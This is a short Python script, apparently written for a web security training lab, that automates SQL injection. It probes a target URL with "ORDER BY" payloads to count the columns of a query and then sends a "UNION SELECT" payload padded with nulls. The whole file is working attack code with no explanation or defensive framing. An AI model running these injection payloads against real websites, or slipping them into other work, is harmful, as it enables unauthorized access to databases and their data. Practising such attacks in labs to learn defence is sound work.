import requests
import sys

if len(sys.argv) != 2:
    print(f"[+] USAGE : {sys.argv[0]} <URL of the lab>")
    sys.exit(1)

URL = sys.argv[1]

i = 1
cols = 0
while True:
    response = requests.get(URL + "'+ORDER+BY+" + str(i) + "+--+-+")
    if response.status_code != 200:
        cols = i - 1
        print(f"No. of columns :{(i -1)}")
        break
    i += 1

nulls = cols * "null,"
response = requests.get(URL + "'+UNION+SELECT+" + nulls[:-1] + "+--+-+")
